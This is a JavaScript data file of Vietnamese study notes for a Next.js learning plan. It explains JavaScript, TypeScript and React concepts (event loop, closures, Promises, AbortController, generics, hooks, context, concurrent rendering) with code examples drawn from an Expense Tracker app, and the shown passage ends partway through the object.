/* Next.js: plan topic explanations (concept / explanation / real example), keyed w<module>k<topic> */
const EXPL_NX = {
"w0k0": {
c: "Event loop là cơ chế của runtime (trình duyệt, Node.js) giúp JavaScript chạy đơn luồng vẫn xử lý được việc bất đồng bộ: mỗi khi call stack trống, nó lấy công việc tiếp theo từ các hàng đợi để chạy.",
e: "Code đồng bộ chạy trên <b>call stack</b>; timer, network, I/O được runtime xử lý bên ngoài rồi đưa callback vào hàng đợi. <b>Microtask</b> gồm callback của Promise (<code>then</code>/<code>catch</code>/<code>finally</code>, phần code sau <code>await</code>) và <code>queueMicrotask</code>. <b>Macrotask</b> (task) gồm <code>setTimeout</code>, <code>setInterval</code>, sự kiện I/O, sự kiện người dùng. Sau mỗi task, engine xả <i>toàn bộ</i> microtask queue, kể cả microtask mới sinh ra trong lúc xả, rồi trình duyệt mới có cơ hội render và lấy task kế tiếp. Vì vậy <code>Promise.then</code> luôn chạy trước <code>setTimeout(fn, 0)</code>, và một chuỗi microtask tự gọi lại vô hạn có thể treo trang dù không có vòng lặp <code>while</code> nào. Node.js còn có <code>process.nextTick</code>, chạy trước cả microtask của Promise.",
x: "Câu phỏng vấn hay gặp là ghép <code>await</code> với timer: phần sau <code>await</code> là microtask nên chạy sau code đồng bộ nhưng trước timer. Trong Expense Tracker, nếu handler “Nhập CSV” parse 50.000 dòng đồng bộ, trang đơ và INP vượt 500 ms. Cách xử lý: chia lô và nhường main thread giữa các lô (<code>await scheduler.yield()</code> nếu trình duyệt hỗ trợ, không thì <code>setTimeout</code>), hoặc đẩy việc parse sang Web Worker.<pre>async function run() {\n  console.log(1);\n  await null;\n  console.log(3);\n}\nsetTimeout(() =&gt; console.log(4), 0);\nrun();\nconsole.log(2);\n// 1, 2, 3, 4</pre>"
},
"w0k1": {
c: "Closure là việc một hàm giữ tham chiếu tới các biến trong scope nơi nó được khai báo (lexical scope), nên vẫn đọc và ghi được chúng sau khi hàm bao ngoài đã chạy xong.",
e: "<ul><li><b>Scope</b>: <code>var</code> có scope theo hàm; <code>let</code>/<code>const</code> có scope theo block <code>{}</code>.</li><li><b>Hoisting</b>: khai báo được xử lý trước khi code trong scope chạy. Function declaration gọi được trước dòng khai báo; <code>var</code> được khởi tạo sẵn là <code>undefined</code>.</li><li><b>TDZ</b> (temporal dead zone): <code>let</code>, <code>const</code>, <code>class</code> cũng được hoist nhưng chưa khởi tạo; truy cập trước dòng khai báo ném <code>ReferenceError</code>.</li><li><b>Stale closure</b>: closure giữ biến của <i>lần chạy</i> đã tạo ra nó. Trong React mỗi lần render là một lần gọi hàm mới, nên callback tạo ở render cũ chỉ thấy props và state cũ.</li></ul>Lỗi kinh điển với <code>var</code> trong vòng lặp: mọi callback dùng chung một biến; <code>let</code> tạo binding mới cho mỗi vòng lặp.",
x: "Bug thật: dashboard Expense Tracker đăng ký WebSocket một lần trong <code>useEffect(..., [])</code>, handler lọc giao dịch mới theo <code>filter</code> lấy từ state. Người dùng đổi bộ lọc nhưng giao dịch mới vẫn bị lọc theo giá trị ban đầu, vì handler là closure của lần render đầu. Sửa bằng cách khai báo đúng dependency, dùng updater function, hoặc tách phần đọc giá trị mới nhất ra <code>useEffectEvent</code>.<pre>for (var i = 0; i &lt; 3; i++) setTimeout(() =&gt; console.log(i));\n// 3, 3, 3\nfor (let j = 0; j &lt; 3; j++) setTimeout(() =&gt; console.log(j));\n// 0, 1, 2\n\nfunction f() {\n  console.log(x); // ReferenceError: x nằm trong TDZ\n  let x = 1;\n}</pre>"
},
"w0k2": {
c: "<code>this</code> là giá trị được xác định tại thời điểm <i>gọi</i> hàm: nó phụ thuộc vào cách hàm được gọi, không phụ thuộc nơi hàm được khai báo. Arrow function là ngoại lệ, nó lấy <code>this</code> từ scope bao ngoài.",
e: "Quy tắc theo thứ tự ưu tiên: gọi bằng <code>new</code> thì <code>this</code> là object mới tạo; gọi qua <code>call</code>/<code>apply</code>/<code>bind</code> thì là giá trị truyền vào; gọi dạng <code>obj.method()</code> thì là <code>obj</code>; gọi trơn <code>fn()</code> thì là <code>undefined</code> trong strict mode (module ES và class luôn strict), là <code>globalThis</code> nếu không strict. <code>call(thisArg, a, b)</code> truyền tham số rời, <code>apply(thisArg, [a, b])</code> truyền mảng, <code>bind</code> trả về hàm mới gắn cố định <code>this</code> và có thể gắn sẵn vài tham số đầu. Arrow function không có <code>this</code> và <code>arguments</code> riêng, không dùng được với <code>new</code>, nên không hợp làm method của object. Lỗi hay gặp nhất: tách method ra khỏi object (<code>const f = obj.method</code> hoặc truyền làm callback) làm mất <code>this</code>.",
x: "Code React hiện đại hiếm khi đụng <code>this</code>, nhưng vẫn gặp khi tích hợp SDK dạng class, ví dụ truyền <code>client.charge</code> thẳng vào <code>onClick</code>: method chạy với <code>this</code> là <code>undefined</code> và ném lỗi. Sửa bằng arrow bọc ngoài <code>() =&gt; client.charge()</code> hoặc <code>client.charge.bind(client)</code>. Câu hỏi kinh điển:<pre>const wallet = {\n  balance: 100,\n  show() { return this.balance; },\n  showArrow: () =&gt; this?.balance,\n};\nwallet.show();          // 100\nconst f = wallet.show;\nf();                    // TypeError: this là undefined (strict)\nwallet.showArrow();     // undefined: this của module\nf.call({ balance: 5 }); // 5</pre>"
},
"w0k3": {
c: "Promise đại diện cho một giá trị sẽ có trong tương lai, ở một trong ba trạng thái pending, fulfilled hoặc rejected; <code>async/await</code> là cú pháp viết code dựa trên Promise theo kiểu tuần tự, lỗi bắt bằng <code>try/catch</code>.",
e: "<ul><li><code>Promise.all</code>: fulfilled khi tất cả xong, reject ngay khi có cái đầu tiên lỗi; các việc còn lại vẫn chạy, chỉ là kết quả bị bỏ.</li><li><code>Promise.allSettled</code>: luôn chờ tất cả, trả mảng <code>{ status, value }</code> hoặc <code>{ status, reason }</code>.</li><li><code>Promise.race</code>: lấy kết quả settle đầu tiên, kể cả lỗi.</li><li><code>Promise.any</code>: lấy cái fulfilled đầu tiên; tất cả lỗi thì reject với <code>AggregateError</code>.</li></ul>Lỗi hay gặp: <code>await</code> lần lượt những việc độc lập (tạo waterfall); quên <code>await</code> hoặc <code>return</code> nên <code>try/catch</code> không bắt được lỗi; dùng <code>forEach(async ...)</code> rồi tưởng đã chờ xong (dùng <code>for...of</code> hoặc <code>Promise.all</code> với <code>map</code>); để Promise bị reject mà không ai xử lý, trong Node.js mặc định làm process dừng.",
x: "Dashboard Expense Tracker gọi ba nguồn: số dư, giao dịch gần đây và tỷ giá. Tỷ giá chỉ là thông tin phụ, lỗi của nó không được làm hỏng cả trang, nên dùng <code>allSettled</code>:<pre>const [balance, recent, rate] = await Promise.allSettled([\n  getBalance(userId),\n  getRecentTx(userId),\n  getFxRate('USD', 'VND'),\n]);\nif (balance.status === 'rejected') throw balance.reason; // bắt buộc phải có\nconst txs = recent.status === 'fulfilled' ? recent.value : [];\nconst fx = rate.status === 'fulfilled' ? rate.value : null; // UI hiện “chưa có tỷ giá”</pre>Nếu cả ba đều bắt buộc thì dùng <code>Promise.all</code> để lỗi sớm và để <code>error.tsx</code> xử lý."
},
"w0k4": {
c: "<code>AbortController</code> là Web API tạo ra một <code>AbortSignal</code> để báo hủy cho các tác vụ bất đồng bộ có hỗ trợ (<code>fetch</code>, <code>addEventListener</code>, stream...); gọi <code>controller.abort()</code> thì tác vụ dừng và Promise của nó reject với lỗi <code>AbortError</code>.",
e: "Promise không tự hủy được, nên muốn hủy phải truyền <code>signal</code> vào API bên dưới. Ba cách dùng chính: <ul><li><b>Hủy theo thao tác</b>: người dùng bấm hủy hoặc component unmount thì gọi <code>abort()</code>.</li><li><b>Timeout</b>: <code>AbortSignal.timeout(5000)</code> tự hủy sau 5 giây với lỗi tên <code>TimeoutError</code>; gộp nhiều điều kiện bằng <code>AbortSignal.any([a, b])</code>.</li><li><b>Bỏ response cũ</b>: mỗi lần query đổi thì hủy request trước, tránh race condition khi kết quả chậm của lần gõ cũ ghi đè kết quả mới.</li></ul>Khi bắt lỗi, kiểm tra <code>err.name === 'AbortError'</code> để không hiện thông báo lỗi cho việc hủy có chủ ý. Một controller chỉ abort được một lần, request mới cần controller mới. <code>addEventListener(type, fn, { signal })</code> cũng tự gỡ listener khi abort, tiện cho cleanup.",
x: "Ô tìm kiếm giao dịch gọi API mỗi khi query đổi (đã debounce). Người dùng gõ “an” rồi “ăn trưa”; nếu request “an” về sau, danh sách hiển thị sai. Cleanup của effect hủy request cũ, kèm timeout 8 giây:<pre>useEffect(() =&gt; {\n  const ctrl = new AbortController();\n  const signal = AbortSignal.any([ctrl.signal, AbortSignal.timeout(8000)]);\n  fetch(`/api/tx?q=${encodeURIComponent(q)}`, { signal })\n    .then((r) =&gt; r.json())\n    .then(setResults)\n    .catch((e) =&gt; {\n      if (e.name !== 'AbortError') setError(e); // TimeoutError vẫn báo lỗi\n    });\n  return () =&gt; ctrl.abort();\n}, [q]);</pre>Khi timeout, fetch reject với <code>TimeoutError</code> nên người dùng vẫn được báo; còn hủy do gõ tiếp thì im lặng."
},
"w0k5": {
c: "Union type (<code>A | B</code>) mô tả giá trị có thể thuộc một trong nhiều kiểu; narrowing là cách TypeScript thu hẹp union về một kiểu cụ thể dựa trên các phép kiểm tra trong luồng code.",
e: "<ul><li><b>Narrowing</b> qua <code>typeof</code>, <code>instanceof</code>, toán tử <code>in</code>, so sánh bằng và kiểm tra truthy.</li><li><b>Discriminated union</b>: mọi nhánh có chung một field literal (<code>kind</code>, <code>status</code>); <code>switch</code> trên field đó thì TS biết chính xác các field còn lại. Thêm nhánh <code>default</code> gán vào biến kiểu <code>never</code> để compiler báo lỗi khi thiếu case.</li><li><b>Type guard</b>: hàm trả về <code>v is T</code> chứa kiểm tra runtime do bạn viết; TS tin bạn hoàn toàn, nên guard sai là type sai.</li><li><b><code>unknown</code> vs <code>any</code></b>: <code>any</code> tắt kiểm tra và lan sang mọi chỗ dùng nó; <code>unknown</code> bắt buộc narrow trước khi dùng.</li></ul>Dữ liệu từ <code>res.json()</code>, <code>JSON.parse</code>, <code>catch (e)</code> nên coi là <code>unknown</code>. Ép <code>as Transaction</code> chỉ là lời hứa với compiler, lúc runtime không có kiểm tra nào.",
x: "Lab tuần 0: parse giao dịch từ JSON ngân hàng gửi về, một số dòng thiếu <code>amount</code> hoặc để dạng chuỗi. Type guard kết hợp discriminated union cho kết quả:<pre>type Tx = { id: string; amount: number; kind: 'income' | 'expense' };\ntype Parsed = { ok: true; tx: Tx } | { ok: false; error: string };\n\nfunction isTx(v: unknown): v is Tx {\n  if (typeof v !== 'object' || v === null) return false;\n  const o = v as Record&lt;string, unknown&gt;;\n  return typeof o.id === 'string' &amp;&amp; typeof o.amount === 'number'\n    &amp;&amp; (o.kind === 'income' || o.kind === 'expense');\n}\nconst parse = (v: unknown): Parsed =&gt;\n  isTx(v) ? { ok: true, tx: v } : { ok: false, error: 'invalid row' };</pre>Khi schema lớn hơn, dùng zod (<code>safeParse</code>) để khỏi viết guard bằng tay và có thông báo lỗi theo từng field."
},
"w0k6": {
c: "Generics là tham số kiểu (<code>&lt;T&gt;</code>) giúp viết hàm, type, component dùng lại được mà vẫn giữ liên kết giữa kiểu đầu vào và đầu ra; utility types là các type có sẵn để biến đổi một type khác.",
e: "<ul><li><b>Generics</b> thường kèm ràng buộc <code>T extends ...</code>; TS tự suy ra <code>T</code> từ tham số nên ít khi phải viết tường minh.</li><li><b><code>keyof T</code></b> cho union các key của <code>T</code>; <code>T[K]</code> lấy kiểu của field <code>K</code>.</li><li><b><code>typeof</code></b> ở vị trí type lấy kiểu từ một giá trị có sẵn (object cấu hình, hàm).</li><li><b>Utility types</b>: <code>Partial&lt;T&gt;</code> (mọi field optional, hợp payload PATCH), <code>Pick</code>/<code>Omit</code> (chọn hoặc bỏ field, ví dụ bỏ <code>passwordHash</code> khi tạo DTO), <code>Record&lt;K, V&gt;</code> (map key sang value), <code>ReturnType&lt;typeof fn&gt;</code> (kiểu trả về; với hàm async thì bọc thêm <code>Awaited</code>).</li></ul>Sai lầm hay gặp: tham số generic chỉ xuất hiện một lần (không nối gì cả, chẳng khác gì <code>unknown</code>), hoặc viết type quá phức tạp khiến thông báo lỗi khó đọc. Nguyên tắc: generic có ích khi nó nối ít nhất hai vị trí.",
x: "Expense Tracker cần hàm nhóm giao dịch theo một field bất kỳ mà vẫn trả đúng kiểu, cùng vài type suy ra từ type gốc:<pre>function groupBy&lt;T, K extends keyof T&gt;(items: T[], key: K) {\n  const out = {} as Record&lt;string, T[]&gt;;\n  for (const item of items) {\n    const k = String(item[key]);\n    (out[k] ??= []).push(item);\n  }\n  return out;\n}\nconst byCategory = groupBy(txs, 'category'); // Record&lt;string, Tx[]&gt;\n\ntype TxUpdate = Partial&lt;Omit&lt;Tx, 'id' | 'userId'&gt;&gt;;\ntype Summary = Awaited&lt;ReturnType&lt;typeof getMonthlySummary&gt;&gt;;</pre>Gõ sai <code>groupBy(txs, 'categry')</code> sẽ báo lỗi ngay lúc compile, và <code>Summary</code> tự cập nhật khi hàm đổi kiểu trả về."
},
"w0k7": {
c: "<code>satisfies</code> kiểm tra một biểu thức có khớp type hay không nhưng vẫn giữ kiểu suy luận cụ thể của nó; <code>as const</code> biến literal thành kiểu hẹp nhất và <code>readonly</code>; <code>strict</code> là cờ trong tsconfig bật cả nhóm kiểm tra nghiêm ngặt.",
e: "<ul><li>Annotation <code>const x: T = ...</code> làm mất thông tin cụ thể, TS chỉ còn biết <code>x</code> là <code>T</code>. <code>as T</code> là ép kiểu, có thể che lỗi. <code>satisfies T</code> (từ TS 4.9) báo lỗi khi thiếu hoặc sai field mà vẫn giữ literal type, nên autocomplete và narrowing vẫn chính xác.</li><li><code>as const</code>: <code>['vi', 'en'] as const</code> có kiểu <code>readonly ['vi', 'en']</code>; dùng <code>(typeof LOCALES)[number]</code> để sinh union từ một nguồn duy nhất.</li><li><code>strict: true</code> bật <code>strictNullChecks</code>, <code>noImplicitAny</code>, <code>strictFunctionTypes</code>, <code>useUnknownInCatchVariables</code> và vài cờ khác. Nên bật thêm <code>noUncheckedIndexedAccess</code> (không nằm trong strict) để <code>arr[i]</code> có kiểu <code>T | undefined</code>.</li></ul>Project mới nên bật strict ngay từ đầu; codebase cũ thì bật dần từng cờ và sửa lỗi theo đợt thay vì tắt hẳn.",
x: "Bảng danh mục chi tiêu của Expense Tracker: cần đảm bảo danh mục nào cũng có đủ nhãn và màu, nhưng vẫn muốn key là literal để làm type:<pre>const CATEGORIES = {\n  food: { label: 'Ăn uống', color: '#f97316' },\n  rent: { label: 'Nhà ở', color: '#3b82f6' },\n  transport: { label: 'Đi lại', color: '#22c55e' },\n} satisfies Record&lt;string, { label: string; color: string }&gt;;\n\ntype Category = keyof typeof CATEGORIES; // 'food' | 'rent' | 'transport'\n\nconst LOCALES = ['vi', 'en'] as const;\ntype Locale = (typeof LOCALES)[number]; // 'vi' | 'en'</pre>Nếu khai báo <code>const CATEGORIES: Record&lt;string, ...&gt;</code> thì <code>Category</code> chỉ còn là <code>string</code>, mất hết lợi ích kiểm tra."
},
"w0k8": {
c: "Debounce trì hoãn việc gọi hàm cho tới khi sự kiện ngừng xảy ra trong một khoảng thời gian; throttle giới hạn hàm chạy tối đa một lần mỗi khoảng; retry có backoff thử lại thao tác lỗi với thời gian chờ tăng dần.",
e: "Đây là các bài live coding phổ biến nhất vì kiểm tra cùng lúc closure, timer và Promise. <ul><li><b>Debounce</b>: mỗi lần gọi thì <code>clearTimeout</code> rồi đặt timer mới; hợp với ô tìm kiếm, autosave.</li><li><b>Throttle</b>: nhớ thời điểm chạy gần nhất, bỏ qua các lần gọi trong khoảng chờ, có thể thêm một lần chạy cuối (trailing); hợp với scroll, resize, kéo thả.</li><li><b>Retry + exponential backoff</b>: chờ <code>base * 2^n</code> cộng thêm <i>jitter</i> ngẫu nhiên để nhiều client không thử lại cùng lúc; chỉ retry lỗi tạm thời (network, 429, 5xx), không retry 4xx, và chỉ retry thao tác idempotent.</li><li><b>Promise.all tự viết</b>: kết quả giữ thứ tự theo index chứ không theo thứ tự hoàn thành, đếm số đã xong, reject ngay ở lỗi đầu tiên, mảng rỗng resolve <code>[]</code>, phần tử không phải Promise thì bọc bằng <code>Promise.resolve</code>.</li></ul>",
x: "Lab tuần 0 yêu cầu <code>retry(fn, n)</code> cho việc đồng bộ giao dịch với API ngân hàng hay trả 503, và <code>debounce</code> cho ô tìm kiếm:<pre>async function retry&lt;T&gt;(fn: () =&gt; Promise&lt;T&gt;, retries = 3, base = 300): Promise&lt;T&gt; {\n  for (let attempt = 0; ; attempt++) {\n    try {\n      return await fn();\n    } catch (err) {\n      if (attempt &gt;= retries) throw err;\n      const delay = base * 2 ** attempt + Math.random() * base;\n      await new Promise((r) =&gt; setTimeout(r, delay));\n    }\n  }\n}\nfunction debounce&lt;A extends unknown[]&gt;(fn: (...a: A) =&gt; void, ms: number) {\n  let t: ReturnType&lt;typeof setTimeout&gt; | undefined;\n  return (...args: A) =&gt; { clearTimeout(t); t = setTimeout(() =&gt; fn(...args), ms); };\n}</pre>Người phỏng vấn thường hỏi tiếp: thêm tham số <code>shouldRetry(err)</code> và hỗ trợ <code>AbortSignal</code> để hủy giữa chừng."
},
"w1k0": {
c: "Render là lúc React gọi component để tính ra cây UI mới; commit là lúc React áp các thay đổi tối thiểu vào DOM. Component thuần (pure) là component với cùng props, state, context luôn trả về cùng kết quả và không gây side effect khi render.",
e: "Một lần cập nhật đi qua ba bước: <b>trigger</b> (render đầu tiên hoặc state thay đổi), <b>render</b> (gọi hàm component, đi xuống các con, so sánh với cây trước), <b>commit</b> (sửa DOM, gắn ref, chạy layout effect rồi effect). Render có thể bị gọi nhiều lần, bị bỏ dở hoặc chạy lại (concurrent rendering), nên trong thân component không được làm side effect: không gọi API, không sửa biến bên ngoài, không mutate props hay state. Side effect thuộc về event handler hoặc effect. <b>Strict Mode</b> chỉ hoạt động ở development: nó cố tình render hai lần và chạy effect theo chu trình setup, cleanup, setup để lộ ra code không thuần hoặc thiếu cleanup; production không bị ảnh hưởng. Render lại không có nghĩa là DOM bị vẽ lại: nếu kết quả không đổi, bước commit không chạm vào DOM.",
x: "Bug thật: <code>TransactionList</code> gọi <code>items.sort(...)</code> ngay trong render. <code>sort</code> mutate mảng gốc đến từ props, nên thứ tự ở các chỗ khác dùng chung mảng đó cũng bị đổi, và Strict Mode làm lỗi lộ rõ hơn. Sửa bằng bản sao:<pre>function TransactionList({ items }: { items: Tx[] }) {\n  // Sai: items.sort(byDate) mutate props\n  const sorted = items.toSorted((a, b) =&gt; b.date.localeCompare(a.date));\n  return &lt;ul&gt;{sorted.map((t) =&gt; &lt;Row key={t.id} tx={t} /&gt;)}&lt;/ul&gt;;\n}</pre>Tương tự, câu hỏi “vì sao effect chạy 2 lần ở dev” có câu trả lời đúng là: do Strict Mode, và cách xử lý là viết cleanup cho effect chứ không phải tắt Strict Mode."
},
"w1k1": {
c: "State là bộ nhớ riêng của một component giữa các lần render; mỗi lần render đọc một <i>snapshot</i> cố định của state, và gọi setter là yêu cầu React render lại với giá trị mới.",
e: "<ul><li><b>Snapshot</b>: trong một lần render, biến state là hằng số. Gọi <code>setCount(count + 1)</code> không đổi <code>count</code> ngay; handler vẫn thấy giá trị cũ cho tới khi chạy xong.</li><li><b>Batching</b>: React gom mọi lần set trong cùng một event thành một lần render; từ React 18, việc gom này áp dụng cả trong Promise và timeout. Vì vậy gọi <code>setCount(count + 1)</code> ba lần liền chỉ tăng 1.</li><li><b>Updater function</b> <code>setCount(c =&gt; c + 1)</code>: React xếp các hàm vào hàng đợi và áp lần lượt lên giá trị mới nhất, nên ba lần gọi tăng 3. Dùng khi giá trị mới phụ thuộc giá trị cũ, nhất là trong callback bất đồng bộ.</li></ul>Với object và mảng, luôn tạo bản mới (<code>{ ...prev, x }</code>, <code>[...prev, item]</code>) vì React so sánh bằng <code>Object.is</code>: mutate rồi set lại cùng tham chiếu thì React bỏ qua lần render đó.",
x: "Nút “Thêm 3 giao dịch mẫu” gọi <code>setTxs([...txs, sample])</code> ba lần trong vòng lặp nhưng chỉ thêm được một dòng, vì cả ba lần đều đọc cùng snapshot <code>txs</code>. Viết lại bằng updater:<pre>function addSamples(n: number) {\n  for (let i = 0; i &lt; n; i++) {\n    setTxs((prev) =&gt; [...prev, makeSample(i)]);\n  }\n  console.log(txs.length); // vẫn là giá trị cũ: state là snapshot\n}</pre>Câu hỏi đi kèm: vì sao <code>console.log</code> ngay sau <code>setState</code> in giá trị cũ, và muốn dùng giá trị mới thì làm sao. Trả lời: tính giá trị mới vào một biến rồi dùng biến đó trong handler; chỉ dùng effect khi cần đồng bộ với hệ thống bên ngoài."
},
"w1k2": {
c: "React gắn state vào <i>vị trí</i> của component trong cây UI; <code>key</code> là danh tính bổ sung giúp React nhận ra cùng một phần tử giữa các lần render, kể cả khi vị trí của nó thay đổi.",
e: "Khi render lại, nếu ở cùng vị trí vẫn là cùng loại component với cùng key, React giữ nguyên state; nếu đổi loại hoặc đổi key, React unmount cái cũ (mất state) và mount cái mới. Hệ quả: <ul><li>Trong danh sách, key phải ổn định và duy nhất giữa các phần tử anh em, lấy từ id của dữ liệu. Dùng index thì khi chèn, xóa, sắp xếp, state như giá trị input, checkbox, focus bị gắn nhầm sang item khác; dùng <code>Math.random()</code> thì mỗi lần render đều tạo component mới.</li><li>Đổi key là cách chủ động reset state: <code>&lt;Form key={userId} /&gt;</code>.</li><li>Khai báo component bên trong một component khác tạo ra kiểu mới ở mỗi lần render, nên state của nó bị reset liên tục.</li></ul>Key chỉ cần duy nhất trong cùng một mảng, không cần duy nhất toàn cục.",
x: "Bug thật: danh sách giao dịch cho sửa ghi chú trực tiếp bằng input uncontrolled, dùng <code>key={index}</code>. Người dùng xóa dòng đầu thì ghi chú đang gõ dở “nhảy” sang dòng kế tiếp; sửa bằng <code>key={tx.id}</code>. Trường hợp ngược lại: form sửa giao dịch giữ dữ liệu của giao dịch A khi chuyển sang B. Thay vì viết effect xóa state, reset bằng key:<pre>{txs.map((tx) =&gt; (\n  &lt;TxRow key={tx.id} tx={tx} /&gt;\n))}\n\n&lt;EditTxForm key={tx.id} initial={tx} /&gt;</pre>Lưu ý khi bật Cache Components, Next.js giữ route cũ ở trạng thái ẩn bằng <code>&lt;Activity&gt;</code> thay vì unmount, nên state còn nguyên khi quay lại trang; muốn reset thì cũng dùng key hoặc reset chủ động."
},
"w1k3": {
c: "<code>useEffect</code> đồng bộ component với một hệ thống bên ngoài React (subscription, WebSocket, DOM API, widget bên thứ ba); nó chạy sau commit, chạy lại khi dependency đổi, và cleanup chạy trước lần chạy tiếp theo hoặc khi unmount.",
e: "Dependency array phải liệt kê mọi giá trị reactive (props, state, hàm khai báo trong component) mà effect dùng; rule <code>react-hooks/exhaustive-deps</code> giúp không bỏ sót, và khai báo thiếu dependency là nguồn gốc của stale closure. Cleanup phải hủy đúng thứ setup đã tạo: hủy subscription, <code>clearInterval</code>, abort fetch. <b>Không cần effect</b> khi: tính giá trị suy ra từ props/state (tính thẳng trong render); phản ứng với hành động người dùng (đặt trong event handler); reset state theo prop (dùng key); fetch dữ liệu ban đầu (trong App Router nên làm ở Server Component). <b><code>useEffectEvent</code></b> (ổn định từ React 19.2) tạo một hàm luôn đọc được props/state mới nhất nhưng không phải dependency, dành cho phần logic “không reactive” bên trong effect. Chỉ gọi nó từ bên trong effect, không truyền xuống component khác.",
x: "Dashboard Expense Tracker mở kết nối realtime theo <code>walletId</code>; khi có giao dịch mới thì hiện toast theo <code>currency</code> người dùng chọn. Nếu đưa <code>currency</code> vào dependency, mỗi lần đổi tiền tệ socket sẽ bị ngắt rồi nối lại. Tách bằng <code>useEffectEvent</code>:<pre>const onTx = useEffectEvent((tx: Tx) =&gt; {\n  toast(`+${formatMoney(tx.amount, currency)}`);\n});\n\nuseEffect(() =&gt; {\n  const socket = connect(walletId);\n  socket.on('tx', onTx);\n  return () =&gt; socket.close();\n}, [walletId]);</pre>Ngược lại, effect kiểu <code>useEffect(() =&gt; setTotal(sum(txs)), [txs])</code> là thừa và gây thêm một lần render: chỉ cần <code>const total = sum(txs)</code>."
},
"w1k4": {
c: "<code>useRef</code> giữ một giá trị thay đổi được qua các lần render mà không gây render lại; <code>useMemo</code>/<code>useCallback</code> ghi nhớ kết quả tính toán hoặc hàm theo dependency; <code>memo</code> bỏ qua render của component khi props không đổi; React Compiler tự thêm các memoization này lúc build.",
e: "<ul><li><b>useRef</b>: tham chiếu DOM, id của timer, giá trị trước đó. Không đọc/ghi <code>ref.current</code> trong lúc render vì nó không phải state.</li><li><b>useMemo</b>: tránh tính lại việc nặng, hoặc giữ tham chiếu ổn định cho object truyền xuống con; <b>useCallback</b> là <code>useMemo</code> dành cho hàm.</li><li><b>memo</b>: chỉ có tác dụng khi props thật sự ổn định; truyền object hoặc hàm mới ở mỗi render là vô hiệu hóa nó.</li><li><b>React Compiler 1.0</b> (10/2025) phân tích code lúc build và tự memoize component, giá trị, hàm, chi tiết hơn viết tay. Next.js 16 hỗ trợ ổn định qua <code>reactCompiler: true</code> nhưng chưa bật mặc định vì build chậm hơn. Compiler chỉ tối ưu được code tuân thủ Rules of React; <code>useMemo</code>/<code>useCallback</code> vẫn hữu ích khi cần kiểm soát chính xác, ví dụ giá trị làm dependency của effect.</li></ul>Nguyên tắc chung: đo bằng React DevTools Profiler trước khi thêm memo.",
x: "Trang báo cáo Expense Tracker có biểu đồ nặng nhận <code>data</code> và <code>onSelect</code>. Mỗi lần gõ vào ô ghi chú, biểu đồ render lại vì <code>data</code> là mảng mới. Khi chưa có compiler:<pre>const chartData = useMemo(() =&gt; aggregateByDay(txs), [txs]);\nconst onSelect = useCallback((day: string) =&gt; router.push(`?day=${day}`), [router]);\nreturn &lt;Chart data={chartData} onSelect={onSelect} /&gt;; // Chart bọc memo\n\n// next.config.ts\nconst nextConfig: NextConfig = { reactCompiler: true };</pre>Bật compiler (cài thêm <code>babel-plugin-react-compiler</code>) rồi so lại trên Profiler, phần lớn <code>useMemo</code> viết tay có thể bỏ. Cách rẻ hơn cả hai: chuyển state của ô ghi chú xuống một component con để biểu đồ không bị ảnh hưởng."
},
"w1k5": {
c: "Context truyền một giá trị xuống toàn bộ cây con mà không phải đi qua props từng tầng; mọi component đọc context bằng <code>use(Ctx)</code> hoặc <code>useContext(Ctx)</code> sẽ render lại khi giá trị của Provider thay đổi.",
e: "Context hợp với dữ liệu nhiều nơi cần và ít khi đổi: theme, locale, user hiện tại, instance của store. React so sánh <code>value</code> bằng <code>Object.is</code>; truyền object literal <code>value={{ user, setUser }}</code> tạo object mới mỗi lần Provider render, nên mọi consumer render lại dù dữ liệu không đổi. <code>memo</code> ở các tầng giữa không chặn được, vì consumer đăng ký trực tiếp vào context. Cách giảm render: memo hóa value (hoặc để React Compiler làm), tách context theo tần suất thay đổi (state và hàm set riêng), đặt Provider gần nơi dùng, hoặc chuyển state đổi liên tục sang store có selector như Zustand. Từ React 19 có thể viết <code>&lt;ThemeContext value={...}&gt;</code> thay cho <code>.Provider</code>, và <code>use(Ctx)</code> gọi được trong câu điều kiện. Server Component không đọc được context, nên Provider phải là Client Component.",
x: "Expense Tracker đặt cả <code>filters</code> (đổi theo từng phím gõ) và <code>currency</code> vào một <code>AppContext</code>, làm sidebar, header và biểu đồ render lại mỗi lần gõ. Tách theo tần suất thay đổi:<pre>'use client';\nexport const CurrencyContext = createContext&lt;Currency&gt;('VND');\nexport const SetCurrencyContext = createContext&lt;(c: Currency) =&gt; void&gt;(() =&gt; {});\n\nexport function Providers({ children }: { children: React.ReactNode }) {\n  const [currency, setCurrency] = useState&lt;Currency&gt;('VND');\n  return (\n    &lt;CurrencyContext value={currency}&gt;\n      &lt;SetCurrencyContext value={setCurrency}&gt;{children}&lt;/SetCurrencyContext&gt;\n    &lt;/CurrencyContext&gt;\n  );\n}</pre>Component chỉ cần đổi tiền tệ đọc <code>SetCurrencyContext</code> (hàm set ổn định) nên không render lại. Còn <code>filters</code> thì đưa lên URL: vừa share được link, vừa không cần context."
},
"w1k6": {
c: "Đây là nhóm API concurrent của React: <code>useTransition</code> và <code>useDeferredValue</code> đánh dấu cập nhật không gấp để UI vẫn phản hồi; <code>Suspense</code> hiển thị fallback khi cây con đang chờ dữ liệu hoặc code; <code>use()</code> đọc giá trị của Promise hoặc context ngay trong lúc render.",
e: "<ul><li><b>useTransition</b>: <code>const [isPending, startTransition] = useTransition()</code>. Cập nhật trong <code>startTransition</code> có thể bị ngắt bởi input của người dùng, và React giữ UI cũ thay vì quay lại fallback của Suspense đã hiển thị. Từ React 19, hàm truyền vào có thể là async (gọi là Action).</li><li><b>useDeferredValue</b>: dùng khi bạn chỉ có giá trị, không kiểm soát lời gọi set; React render trước với giá trị cũ, rồi render nền với giá trị mới.</li><li><b>Suspense</b>: ranh giới loading theo từng khu vực; trong Next.js nó còn là ranh giới streaming.</li><li><b>use(promise)</b>: suspend tới khi Promise resolve, lỗi được ném lên error boundary gần nhất. Promise phải được tạo bên ngoài render (ví dụ truyền từ Server Component xuống) hoặc được cache; tạo Promise mới ngay trong render sẽ suspend lại mãi.</li></ul>",
